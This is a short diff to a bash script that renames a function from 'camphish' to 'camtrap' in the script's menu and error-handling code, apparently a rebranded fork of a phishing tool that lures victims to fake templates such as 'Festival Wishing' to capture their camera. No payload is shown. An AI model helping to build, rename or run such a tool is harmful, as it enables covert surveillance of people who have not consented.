@@ -460,7 +460,7 @@ fi
 rm -rf index3.html
 }
 
-camphish() {
+camtrap() {
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
@@ -481,7 +481,7 @@ else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
 sleep 1
 clear
-camphish
+camtrap
 fi
 }
 
@@ -491,7 +491,7 @@ printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
 sleep 1
 clear
 banner
-camphish
+camtrap
 else
 printf "\n-----Choose a template----\n"    
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
@@ -517,4 +517,4 @@ fi
 
 banner
 dependencies
-camphish
+camtrap
